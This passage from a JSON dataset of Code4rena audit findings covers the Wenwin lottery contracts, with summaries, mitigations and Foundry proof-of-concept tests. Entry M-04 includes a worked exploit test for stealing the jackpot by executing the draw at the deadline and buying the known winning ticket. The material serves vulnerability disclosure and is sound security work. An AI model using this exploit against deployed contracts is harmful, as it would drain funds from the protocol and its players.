Solidity compiler.\n\nExamples\nNote: The following pattern is prevalent in the codebase:\n```\nfunction f(bytes memory data) external {\n    (...) = abi.decode(data, (..., types, ...));\n}\n```\nHere, changing to bytes calldata will decrease the gas. The total\nsavings for this change across all such uses would be quite\nsignificant.\n\n### Proof Of Concept\n\n\n```solidity\nfunction packFixedRewards(uint256[] memory rewards) private view returns (uint256 packed) {\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/LotterySetup.sol#L164\n\n```solidity\nfunction fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {\n```\n\nhttps://github.com/code-423n4/2023-03-wenwin/tree/main/src/VRFv2RNSource.sol#L32\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#g-01-use-calldata-instead-of-memory-for-function-parameters",
      "tags": [],
      "finders": []
    },
    {
      "id": "8913",
      "title": "[L-04] Missing event for important parameter change",
      "impact": "LOW",
      "content": "\nImportant parameter or configuration changes should trigger an event to allow being tracked off-chain.\n\n*Instances (2)*:\n\n- https://github.com/code-423n4/2023-03-wenwin/blob/main/src/staking/StakedTokenLock.sol#L24\n\n- https://github.com/code-423n4/2023-03-wenwin/blob/main/src/staking/StakedTokenLock.sol#L37\n\n## Non-Critical Risk Issues Summary\n\n| |Issue|Instances|\n|-|:-|:-:|\n|N-01 | Import declarations should import specific symbols | 53 |\n| N-02 | Use named parameters for mapping type declarations | 17 |\n| N-03 | Refactor common code across functions | 1 |\n| N-04 | Unused local variables | 1 |\n| N-05 | Use a modifier for access control | 1 |\n| N-06 | Contract files should define a locked compiler version | 2 |\n| N-07 | Simplify unpacking expression in `fixedReward` | 1 |\n| N-08 | First win tier is always empty in `packFixedRewards` | 1 |\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#l-04-missing-event-for-important-parameter-change",
      "tags": [],
      "finders": []
    },
    {
      "id": "8912",
      "title": "[L-03] Limits in `getMinimumEligibleReferralsFactorCalculation` should be inclusive",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-03-wenwin/blob/main/src/ReferralSystem.sol#L111-L130\n\n```solidity\nfunction getMinimumEligibleReferralsFactorCalculation(uint256 totalTicketsSoldPrevDraw)\n    internal\n    view\n    virtual\n    returns (uint256 minimumEligible)\n{\n    if (totalTicketsSoldPrevDraw < 10_000) {\n        // 1%\n        return totalTicketsSoldPrevDraw.getPercentage(PercentageMath.ONE_PERCENT);\n    }\n    if (totalTicketsSoldPrevDraw < 100_000) {\n        // 0.75%\n        return totalTicketsSoldPrevDraw.getPercentage(PercentageMath.ONE_PERCENT * 75 / 100);\n    }\n    if (totalTicketsSoldPrevDraw < 1_000_000) {\n        // 0.5%\n        return totalTicketsSoldPrevDraw.getPercentage(PercentageMath.ONE_PERCENT * 50 / 100);\n    }\n    return 5000;\n}\n```\n\nThe [protocol documentation](https://docs.wenwin.com/wenwin-lottery/protocol-architecture/token/rewards/referrals#referrers-allocation) specifies that the total ticket sold limits should be inclusive during the calculation of the minimum referral eligibility. However, the different conditions in the if statements use a strict inequality to define the bounds to calculate the eligibility factor.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#l-03-limits-in-getminimumeligiblereferralsfactorcalculation-should-be-inclusive",
      "tags": [],
      "finders": []
    },
    {
      "id": "8911",
      "title": "[L-02] `DRAWS_PER_YEAR` assumes one draw per week",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-03-wenwin/blob/main/src/LotteryMath.sol#L24\n\nThe `DRAWS_PER_YEAR` constant is fixed at 52 assuming one draw lasts one week, while the lottery can be configured with an arbitrary draw period.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#l-02-draws_per_year-assumes-one-draw-per-week",
      "tags": [],
      "finders": []
    },
    {
      "id": "8910",
      "title": "[L-01] `claimable` function doesn't validate ticket draw is finished",
      "impact": "LOW",
      "content": "\nhttps://github.com/code-423n4/2023-03-wenwin/blob/main/src/Lottery.sol#L159-L168\n\nThe function should validate that the draw associated with the ticket is already finished, as the function uses the winning ticket to run the calculation and this value will be undefined until the draw is finished and a ticket is selected.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "#l-01-claimable-function-doesnt-validate-ticket-draw-is-finished",
      "tags": [],
      "finders": []
    },
    {
      "id": "8909",
      "title": "[M-07] Locking rewards tokens in Staking contract when there are no stakes",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/Lottery.sol#L151> \n\n<https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/staking/Staking.sol#L48>\n\n### Impact\n\nBlocking rewards assigned to stakes from the sale of lottery tickets when stakes are absent in the `Staking` contract.\n\n*So, the situation is unlikely, but it can happen.*\n\n### Proof of Concept\n\nIn order to confirm the problem, we need to prove 2 things:\n\n1.  That there may be no staked tokens -> #Total supply == 0\n2.  That the reward that will be transferred to the contract will be blocked -> #Locked tokens\n\n**Total supply == 0:**\n\nFlow 1:\n\n1.  Deploy protocol\n2.  Anyone buys tickets\n3.  Anyone calls [claimRewards()](https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/Lottery.sol#L151) for `LotteryRewardType.STAKING`\n4.  Since no one has managed to stake the tokens yet, the reward for the first sold tickets will be transferred to the staking contract and blocked\n5.  First user stakes tokens and we can see the Staking contract will have rewards but for first user `rewardPerToken` will start from `0` and  `lastUpdateTicketId` will update to actually\n\n```solidity\nsrc/staking/Staking.sol\n\n50: if (_totalSupply == 0) { // totalSupply == 0\n51:     return rewardPerTokenStored;\n\n120: rewardPerTokenStored = currentRewardPerToken; // will set 0\n121: lastUpdateTicketId = lottery.nextTicketId(); // set actually\n```\n\n6.  Tokens before the first stake will be blocked forever\n\nFlow 2:\n\n1.  Everything is going well. The first bets are made before the sale of the first tokens\n2.  But there will moments when all the stakers withdraw their bets\n3.  Get time periods when `totalSupply == 0`\n4.  During these periods, all the rewards that will come will be blocked on the contract by analogy with the first flow.\n\n**Locked tokens**\n\n*   Tokens are blocked because `rewardPerTokenStored` is not updated when `totalSupply == 0`\n\nLet's just write a test:\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"./LotteryTestBase.sol\";\nimport \"../src/Lottery.sol\";\nimport \"./TestToken.sol\";\nimport \"forge-std/console2.sol\";\nimport \"../src/interfaces/ILottery.sol\";\n\ncontract StakingTest is LotteryTestBase {\n    IStaking public staking;\n    address public constant STAKER = address(69);\n\n    ILotteryToken public stakingToken;\n\n    function setUp() public override {\n        super.setUp();\n        staking = IStaking(lottery.stakingRewardRecipient());\n        stakingToken = ILotteryToken(address(lottery.nativeToken()));\n    }\n\n    function testDelayFirstStake() public {\n        console.log(\n            \"Init state totalSupply: %d, rewards: %d, rewardPerTokenStored: %d\",\n            staking.totalSupply(),\n            rewardToken.balanceOf(address(staking)),\n            staking.rewardPerTokenStored()\n        );\n        buySameTickets(lottery.currentDraw(), uint120(0x0F), address(0), 4);\n        lottery.claimRewards(LotteryRewardType.STAKING);\n        console.log(\n            \"After buy tickets totalSupply: %d, rewards: %d, rewardPerTokenStored: %d\",\n            staking.totalSupply(),\n            rewardToken.balanceOf(address(staking)),\n            staking.rewardPerTokenStored()\n        );\n        vm.prank(address(lottery));\n        stakingToken.mint(STAKER, 1e18);\n        vm.startPrank(STAKER);\n        stakingToken.approve(address(staking), 1e18);\n        staking.stake(1e18);\n        console.log(\n            \"After user stake, totalSupply: %d, rewards: %d, rewardPerTokenStored: %d\",\n            staking.totalSupply(),\n            rewardToken.balanceOf(address(staking)),\n            staking.rewardPerTokenStored()\n        );\n        // buy one ticket and get rewards\n        buySameTickets(lottery.currentDraw(), uint120(0x0F), address(0), 1);\n        lottery.claimRewards(LotteryRewardType.STAKING);\n        console.log(\n            \"After buy tickets, totalSupply: %d, rewards: %d, rewardPerTokenStored: %d\",\n            staking.totalSupply(),\n            rewardToken.balanceOf(address(staking)),\n            staking.rewardPerTokenStored()\n        );\n        staking.exit();\n        console.log(\n            \"After user exit, totalSupply: %d, rewards: %d, rewardPerTokenStored: %d\",\n            staking.totalSupply(),\n            rewardToken.balanceOf(address(staking)),\n            staking.rewardPerTokenStored()\n        );\n        buySameTickets(lottery.currentDraw(), uint120(0x0F), address(0), 1);\n        lottery.claimRewards(LotteryRewardType.STAKING);\n        console.log(\n            \"After buy ticket again, totalSupply: %d, rewards: %d, rewardPerTokenStored: %d\",\n            staking.totalSupply(),\n            rewardToken.balanceOf(address(staking)),\n            staking.rewardPerTokenStored()\n        );\n    }\n}\n\n```\n\nResult:\n\n```text\nLogs:\n  Init state totalSupply: 0, rewards: 0, rewardPerTokenStored: 0\n  After buy tickets totalSupply: 0, rewards: 4000000000000000000, rewardPerTokenStored: 0\n  After user stake, totalSupply: 1000000000000000000, rewards: 4000000000000000000, rewardPerTokenStored: 0\n  After buy tickets, totalSupply: 1000000000000000000, rewards: 5000000000000000000, rewardPerTokenStored: 0\n  After user exit, totalSupply: 0, rewards: 4000000000000000000, rewardPerTokenStored: 1000000000000000000\n  After buy ticket again, totalSupply: 0, rewards: 5000000000000000000, rewardPerTokenStored: 1000000000000000000\n```\n\n### Recommended Mitigation Steps\n\nOne of:\n\n1.  Develop a flow where funds should go in case of lack of stakers\n2.  Develop a method of withdrawing blocked coins (which will not be distributed among stakers)\n\n**[cccz (judge) decreased severity to Medium](https://github.com/code-423n4/2023-03-wenwin-findings/issues/76)** \n\n**[rand0c0des (Wenwin) acknowledged](https://github.com/code-423n4/2023-03-wenwin-findings/issues/322)**\n\n***\n\n",
      "summary": "\nThe bug report states that when stakes are absent in the `Staking` contract, rewards assigned to stakes from the sale of lottery tickets are blocked. This is an unlikely situation, but it can happen. To prove this, two things were tested. The first test showed that when no one has managed to stake tokens yet, the reward for the first sold tickets will be transferred to the staking contract and blocked. The second test showed that if all stakers withdraw their bets and there are no tokens staked, all rewards that come in will be blocked on the contract. This is because the `rewardPerTokenStored` is not updated when `totalSupply == 0`.\n\nThe impact of this bug is that tokens may be blocked forever. Manual review and a test were used to confirm the problem. To mitigate this bug, developers should either develop a flow where funds should go in case of lack of stakers, or develop a method of withdrawing blocked coins that will not be distributed among stakers.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/76",
      "tags": [],
      "finders": [
        "Cyfrin  ast3ros",
        "Haipls"
      ]
    },
    {
      "id": "8908",
      "title": "[M-06] Insolvency: The `Lottery` may incorrectly consider a year old jackpot ticket as unclaimed and increase `currentNetProfit` by its prize while it was actually claimed",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-03-wenwin/blob/main/src/Lottery.sol#L135-L137>\n\n<https://github.com/code-423n4/2023-03-wenwin/blob/main/src/Lottery.sol#L164-L166>\n\n### Impact\n\nAccording to the [documentation](https://docs.wenwin.com/wenwin-lottery/the-game):\n\n> \"Winning tickets have up to 1 year to claim their prize. If a prize is not claimed before this period, the unclaimed prize money will go back to the Prize Pot.\"\n\nAs part of this mechanism, the `Lottery.executeDraw()` function (which internally calls `Lottery.returnUnclaimedJackpotToThePot()`) increases `Lottery.currentNetProfit` by the prize of any 1 year old unclaimed jackpot ticket. At this point, the contract thinks it still holds that prize and it's going to include it in the prize pot of the next draw. This function can only be called when `block.timestamp >= drawScheduledAt(currentDraw)`.\n\nOn the other side, the `Lottery.claimWinningTickets()` function (which internally calls `Lottery.claimWinningTicket()` and `Lottery.claimable()`) sends the prize to the owner of a jackpot ticket only if it isn't 1 year old (if `block.timestamp <= ticketRegistrationDeadline(ticketInfo.drawId + LotteryMath.DRAWS_PER_YEAR)`).\n\nHowever, if `Lottery.drawCoolDownPeriod` is zero, both of these conditions can pass on the same time - when the `block.timestamp` is exactly the scheduled draw date of the draw that takes place exactly 1 year after the draw in which the jackpot ticket has won.\n\nIn this edge case, the owner of the jackpot ticket can call `Lottery.executeDraw()`, letting the `Lottery` think the prize wasn't claimed, followed by `Lottery.claimWinningTickets()`, claiming the prize, all in the same transaction.\n\n### Proof of Concept\n\nLet's say Eve buys a ticket to draw #1 in a `Lottery` contract where `Lottery.drawCoolDownPeriod` equals zero, and wins the jackpot. Now, Eve can wait 1 year and then, when `block.timestamp` equals the scheduled draw date of draw #53 (which is also the registration deadline of draw #53), run a transaction that will do the following:\n\n    lottery.executeDraw()\n    lottery.claimWinningTickets([eveJackpotTicketId])\n\nThis will send Eve her prize, but will also leave the contract insolvent.\n\n### Recommended Mitigation Steps\n\nFix `Lottery.claimable()` to set `claimableAmount` to `winAmount[ticketInfo.drawId][winTier]` only if `block.timestamp < ticketRegistrationDeadline(ticketInfo.drawId + LotteryMath.DRAWS_PER_YEAR)` (strictly less than).\n\n**[rand0c0des (Wenwin) disagreed with severity and commented](https://github.com/code-423n4/2023-03-wenwin-findings/issues/167#issuecomment-1470142677):**\n > I think this is Medium, it requires coolDownPeriod of 0 + needs the block executed at the actual time scheduled which might not happen that often.\n\n**[cccz (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-03-wenwin-findings/issues/167#issuecomment-1469246366):**\n > Due to the requirement `drawCoolDownPeriod == 0`, consider Medium.\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability found in the Lottery contract of the WenWin platform. According to the documentation of the platform, winning tickets have up to one year to claim their prize. If a prize is not claimed before this period, the unclaimed prize money will go back to the Prize Pot. \n\nThe vulnerability lies in the fact that the `Lottery.executeDraw()` function increases the `Lottery.currentNetProfit` by the prize of any 1 year old unclaimed jackpot ticket. On the other hand, the `Lottery.claimWinningTickets()` function sends the prize to the owner of a jackpot ticket only if it isn't 1 year old. \n\nThe problem arises when `Lottery.drawCoolDownPeriod` is zero, and when the `block.timestamp` is exactly the scheduled draw date of the draw that takes place exactly 1 year after the draw in which the jackpot ticket has won. In this case, the owner of the jackpot ticket can call `Lottery.executeDraw()`, letting the `Lottery` think the prize wasn't claimed, followed by `Lottery.claimWinningTickets()`, claiming the prize, all in the same transaction. This will send the owner their prize, but will also leave the contract insolvent.\n\nThe recommended mitigation step is to fix `Lottery.claimable()` to set `claimableAmount` to `winAmount[ticketInfo.drawId][winTier]` only if `block.timestamp < ticketRegistrationDeadline(ticketInfo.drawId + LotteryMath.DRAWS_PER_YEAR)` (strictly less than).",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/167",
      "tags": [],
      "finders": [
        "NoamYakov"
      ]
    },
    {
      "id": "8907",
      "title": "[M-05] Unsafe casting from `uint256` to `uint16` could cause ticket prizes to become much smaller than intended",
      "impact": "MEDIUM",
      "content": "\nIn `LotterySetup.sol`, the `packFixedRewards()` function packs a `uint256` array into a `uint256` through bitwise arithmetic:\n\n[`LotterySetup.sol#L164-L176`](https://github.com/code-423n4/2023-03-wenwin/blob/main/src/LotterySetup.sol#L164-L176):\n\n```solidity\nfunction packFixedRewards(uint256[] memory rewards) private view returns (uint256 packed) {\n    if (rewards.length != (selectionSize) || rewards[0] != 0) {\n        revert InvalidFixedRewardSetup();\n    }\n    uint256 divisor = 10 ** (IERC20Metadata(address(rewardToken)).decimals() - 1);\n    for (uint8 winTier = 1; winTier < selectionSize; ++winTier) {\n        uint16 reward = uint16(rewards[winTier] / divisor);\n        if ((rewards[winTier] % divisor) != 0) {\n            revert InvalidFixedRewardSetup();\n        }\n        packed |= uint256(reward) << (winTier * 16);\n    }\n}\n```\n\nThe `rewards[]` parameter stores the prize amount per each `winTier`, where `winTier` is the number of matching numbers a ticket has. `packFixedRewards()` is used when the lottery is first initialized to store the prize for each non-jackpot `winTier`.\n\nThe vulnerability lies in the following line:\n\n```solidity\nuint16 reward = uint16(rewards[winTier] / divisor);\n```\n\nIt casts `rewards[winTier] / divisor`, which is a `uint256`, to a `uint16`. If `rewards[winTier] / divisor` is larger than `2 ** 16 - 1`, the unsafe cast will only keep its rightmost bits, causing the result to be much smaller than defined in `rewards[]`.\n\nAs `divisor` is defined as `10 ** (tokenDecimals - 1)`, the upperbound of `rewards[winTier]` evaluates to `6553.5 * 10 ** tokenDecimals`. This means that the prize of any `winTier` must not be larger than 6553.5 tokens, otherwise the unsafe cast causes it to become smaller than expected.\n\n### Impact\n\nIf a deployer is unaware of this upper limit, he could deploy the lottery with ticket prizes larger than 6553.5 tokens, causing non-jackpot ticket prizes to become significantly smaller. The likelihood of this occuring is increased as:\n\n1.  The upper limit is not mentioned anywhere in the documentation.\n2.  The upper limit is not immediately obvious when looking at the code.\n\nThis upper limit also restricts the protocol from using low price tokens. For example, if the protocol uses SHIB (`$0.00001087` per token), the highest possible prize with 6553.5 tokens is worth only `$0.071236545`.\n\n### Proof of Concept\n\nIf the lottery is initialized with `rewards = [0, 6500, 7000]`, the prize for each `winTier` would become the following:\n\n| `winTier` | Token Amount (in tokenDecimals) |\n| --------- | ------------------------------- |\n| 0         | 0                               |\n| 1         | 6500                            |\n| 2         | 446                             |\n\nThe prize for `winTier = 2` can be derived as such:\n\n    (tokenAmount * 10) & type(uint16).max = (7000 * 10) & (2 ** 16 - 1) = 4464\n    4464 / 10 = 446\n\nThe following test demonstrates the above:\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/LotterySetup.sol\";\nimport \"./TestToken.sol\";\n\ncontract RewardUnsafeCastTest is Test {\n    ERC20 public rewardToken;\n\n    uint8 public constant SELECTION_SIZE = 3;\n    uint8 public constant SELECTION_MAX = 10;\n\n    function setUp() public {\n        rewardToken = new TestToken();\n    }\n\n    function testRewardIsSmallerThanExpected() public {\n        // Get 1 token unit\n        uint256 tokenUnit = 10 ** rewardToken.decimals();\n\n        // Define fixedRewards as [0, 6500, 7000]\n        uint256[] memory fixedRewards = new uint256[](SELECTION_SIZE);\n        fixedRewards[1] = 6500 * tokenUnit;\n        fixedRewards[2] = 7000 * tokenUnit;\n\n        // Initialize LotterySetup contract\n        LotterySetup lotterySetup = new LotterySetup(\n            LotterySetupParams(\n                rewardToken,\n                LotteryDrawSchedule(block.timestamp + 2*100, 100, 60),\n                5 ether,\n                SELECTION_SIZE,\n                SELECTION_MAX,\n                38e16,\n                fixedRewards\n            )\n        );\n\n        // Reward for winTier 1 is 6500\n        assertEq(lotterySetup.fixedReward(1) / tokenUnit, 6500);\n\n        // Reward for winTier 2 is 446 instead of 7000\n        assertEq(lotterySetup.fixedReward(2) / tokenUnit, 446);\n    }\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider storing the prize amount of each `winTier` in a mapping instead of packing them into a `uint256` using bitwise arithmetic. This approach removes the upper limit (6553.5) and lower limit (0.1) for prizes, which would allow the protocol to use tokens with extremely high or low prices.\n\nAlternatively, check if `rewards[winTier] > type(uint256).max` and revert if so. This can be done through OpenZeppelin's [SafeCast](https://docs.openzeppelin.com/contracts/3.x/api/utils#SafeCast-toUint16-uint256-).\n\n**[rand0c0des (Wenwin) confirmed](https://github.com/code-423n4/2023-03-wenwin-findings/issues/245)**\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the LotterySetup.sol contract. The vulnerability lies in the packFixedRewards() function, which packs a uint256 array into a uint256 through bitwise arithmetic. The rewards[] parameter stores the prize amount per each winTier, where winTier is the number of matching numbers a ticket has. The vulnerability occurs when casting rewards[winTier] / divisor, which is a uint256, to a uint16. If rewards[winTier] / divisor is larger than 2 ** 16 - 1, the unsafe cast will only keep its rightmost bits, causing the result to be much smaller than defined in rewards[]. As divisor is defined as 10 ** (tokenDecimals - 1), the upperbound of rewards[winTier] evaluates to 6553.5 * 10 ** tokenDecimals. This means that the prize of any winTier must not be larger than 6553.5 tokens, otherwise the unsafe cast causes it to become smaller than expected.\n\nThe impact of this vulnerability is that if a deployer is unaware of this upper limit, he could deploy the lottery with ticket prizes larger than 6553.5 tokens, causing non-jackpot ticket prizes to become significantly smaller. The likelihood of this occurring is increased as the upper limit is not mentioned anywhere in the documentation and is not immediately obvious when looking at the code. This upper limit also restricts the protocol from using low price tokens.\n\nA proof of concept is provided to demonstrate the vulnerability. It shows that if the lottery is initialized with rewards = [0, 6500, 7000], the prize for each winTier would become [0, 6500, 446] instead of [0, 6500, 7000].\n\nThe recommended mitigation for this vulnerability is to consider storing the prize amount of each winTier in a mapping instead of packing them into a uint256 using bitwise arithmetic. This approach removes the upper limit (6553.5) and lower limit (0.1) for prizes, which would allow the protocol to use tokens with extremely high or low prices. Alternatively, check if rewards[winTier] > type(uint256).max and revert if so.",
      "quality_score": 4.995898613731441,
      "rarity_score": 3.995898613731441,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wenwin",
      "source_link": "https://code4rena.com/reports/2023-03-wenwin",
      "github_link": "https://github.com/code-423n4/2023-03-wenwin-findings/issues/245",
      "tags": [],
      "finders": [
        "d3e4",
        "MiloTruck",
        "kaden",
        "adriro",
        "anodaram",
        "nomoi"
      ]
    },
    {
      "id": "8906",
      "title": "[M-04] Possibility to steal jackpot bypassing restrictions in the `executeDraw()`",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/Lottery.sol#L135>\n\n<https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/LotterySetup.sol#L114>\n\n### Impact\n\nAttacker can run `executeDraw()` in `Lottery.sol`, receive random numbers and *then* buy tickets with known numbers in one block.\n\nHarm: Jackpot\n\n### Proof of Concept\n\nThis vulnerability is possible to use when contract has been deployed with COOL_DOWN_PERIOD = 0;\n\nThe `executeDraw()` is allowed to be called at the last second of draw due to an incorrect comparison `block.timestamp` with `drawScheduledAt(currentDraw)`, which is start of draw.\n\n        function executeDraw() external override whenNotExecutingDraw {\n            // slither-disable-next-line timestamp\n            if (block.timestamp < drawScheduledAt(currentDraw)) { //@dingo should be <= here\n                revert ExecutingDrawTooEarly();\n            }\n            returnUnclaimedJackpotToThePot();\n            drawExecutionInProgress = true;\n            requestRandomNumber();\n            emit StartedExecutingDraw(currentDraw);\n        }\n\nAlso modifier in LotterySetup.sol allows same action:\n\n        modifier beforeTicketRegistrationDeadline(uint128 drawId) {\n            // slither-disable-next-line timestamp\n            if (block.timestamp > ticketRegistrationDeadline(drawId)) { //@dingo should be >= here\n                revert TicketRegistrationClosed(drawId);\n            }\n            _;\n        }\n\nExploit:\n\nAttacker is waiting for last second of `PERIOD` (between to draws).\n\nCall `executeDraw()`. It will affect a `requestRandomNumber()` and chainlink will return random number to `onRandomNumberFulfilled()` at `RNSourceController.sol`.\n\nAttacker now could read received RandomNumber:\n\n\n\n       uint256 winningTicketTemp = lot.winningTicket(0);\n\nAttacker buys new ticket with randomNumber:\n\n<!---->\n\n       uint128[] memory drawId2 = new uint128[](1);\n       drawId2[0] = 0;\n       uint120[] memory winningArray = new uint120[](1);\n       winningArray[0] = uint120(winningTicketTemp); \n\n       lot.buyTickets(drawId2, winningArray, address(0), address(0));\n\nClaim winnings:\n\n       uint256[] memory ticketID = new uint256[](1);\n       ticketID[0] = 1;\n       lot.claimWinningTickets(ticketID);\n\nExploit code:\n\n```\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"./LotteryTestBase.sol\";\nimport \"../src/Lottery.sol\";\nimport \"./TestToken.sol\";\nimport \"test/TestHelpers.sol\";\n\ncontract LotteryTestCustom is LotteryTestBase {\n  address public eoa = address(1234);\n  address public attacker = address(1235);\n\n  function testExploit() public {\n    vm.warp(0);\n    Lottery lot = new Lottery(\n      LotterySetupParams(\n        rewardToken,\n        LotteryDrawSchedule(2 * PERIOD, PERIOD, COOL_DOWN_PERIOD),\n        TICKET_PRICE,\n        SELECTION_SIZE,\n        SELECTION_MAX,\n        EXPECTED_PAYOUT,\n        fixedRewards\n      ),\n      playerRewardFirstDraw,\n      playerRewardDecrease,\n      rewardsToReferrersPerDraw,\n      MAX_RN_FAILED_ATTEMPTS,\n      MAX_RN_REQUEST_DELAY\n    );\n\n    lot.initSource(IRNSource(randomNumberSource));\n\n    vm.startPrank(eoa);\n    rewardToken.mint(1000 ether);\n    rewardToken.approve(address(lot), 100 ether);\n    rewardToken.transfer(address(lot), 100 ether);\n    vm.warp(60 * 60 * 24 + 1);\n    lot.finalizeInitialPotRaise();\n\n    uint128[] memory drawId = new uint128[](1);\n    drawId[0] = 0;\n    uint120[] memory ticketsDigits = new uint120[](1);\n    ticketsDigits[0] = uint120(0x0F); //1,2,3,4 numbers choosed;\n\n    ///@dev Origin user buying ticket.\n    lot.buyTickets(drawId, ticketsDigits, address(0), address(0));\n    vm.stopPrank();\n\n    //====start of attack====\n    vm.startPrank(attacker);\n    rewardToken.mint(1000 ether);\n    rewardToken.approve(address(lot), 100 ether);\n\n    console.log(\"attacker balance before buying ticket:               \", rewardToken.balanceOf(attacker));\n\n    vm.warp(172800); //Attacker is waiting for deadline of draw period, than he could call executeDraw();\n    lot.executeDraw(); //Due to the lack of condition check in executeDraw(`<` should be `<=`). Also call was sent to chainlink.\n    uint256 randomNumber = 0x00;\n    vm.stopPrank();\n\n    vm.prank(address(randomNumberSource));\n    lot.onRandomNumberFulfilled(randomNumber); //chainLink push here randomNumber;\n    uint256 winningTicketTemp = lot.winningTicket(0); //random number from chainlink stores here.\n    console.log(\"Winning ticket number is:                            \", winningTicketTemp);\n\n    vm.startPrank(attacker);\n    uint128[] memory drawId2 = new uint128[](1);\n    drawId2[0] = 0;\n    uint120[] memory winningArray = new uint120[](1);\n    winningArray[0] = uint120(winningTicketTemp); //@audit we will buy ticket with stealed random number below;\n\n    lot.buyTickets(drawId2, winningArray, address(0), address(0)); //attacker can buy ticket with stealed random number.\n\n    uint256[] memory ticketID = new uint256[](1);\n    ticketID[0] = 1;\n    lot.claimWinningTickets(ticketID); //attacker claims winninngs.\n    vm.stopPrank();\n\n    console.log(\"attacker balance after all:                          \", rewardToken.balanceOf(attacker));\n  }\n\n  function reconstructTicket(\n    uint256 randomNumber,\n    uint8 selectionSize,\n    uint8 selectionMax\n  ) internal pure returns (uint120 ticket) {\n    /// Ticket must contain unique numbers, so we are using smaller selection count in each iteration\n    /// It basically means that, once `x` numbers are selected our choice is smaller for `x` numbers\n    uint8[] memory numbers = new uint8[](selectionSize);\n    uint256 currentSelectionCount = uint256(selectionMax);\n\n    for (uint256 i = 0; i < selectionSize; ++i) {\n      numbers[i] = uint8(randomNumber % currentSelectionCount);\n      randomNumber /= currentSelectionCount;\n      currentSelectionCount--;\n    }\n\n    bool[] memory selected = new bool[](selectionMax);\n\n    for (uint256 i = 0; i < selectionSize; ++i) {\n      uint8 currentNumber = numbers[i];\n      // check current selection for numbers smaller than current and increase if needed\n      for (uint256 j = 0; j <= currentNumber; ++j) {\n        if (selected[j]) {\n          currentNumber++;\n        }\n      }\n      selected[currentNumber] = true;\n      ticket |= ((uint120(1) << currentNumber));\n    }\n  }\n}\n\n\n\n```\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\n1.  Change `<` by `<=`:\n\n<!---->\n\n      function executeDraw() external override whenNotExecutingDraw {\n            // slither-disable-next-line timestamp\n            if (block.timestamp < drawScheduledAt(currentDraw)) { //@dingo should be <= here\n                revert ExecutingDrawTooEarly();\n            }\n            returnUnclaimedJackpotToThePot();\n            drawExecutionInProgress = true;\n            requestRandomNumber();\n            emit StartedExecutingDraw(currentDraw);\n        }\n\n2.  Change `>` by `>=`:\n\n```\n   modifier beforeTicketRegistrationDeadline(uint128 drawId) {\n        // slither-disable-next-line timestamp\n        if (block.timestamp > ticketRegistrationDeadline(drawId)) { //@dingo should be >= here\n            revert TicketRegistrationClosed(drawId);\n        }\n        _;\n    }\n\n```\n\n**[rand0c0des (Wenwin) confirmed](https://github.com/code-423n4/2023-03-wenwin-findings/issues/141)**\n\n**[cccz (judge) decreased severity to Medium](https://github.com/code-423n4/2023-03-wenwin-findings/issues/343)** \n\n\n***\n\n",
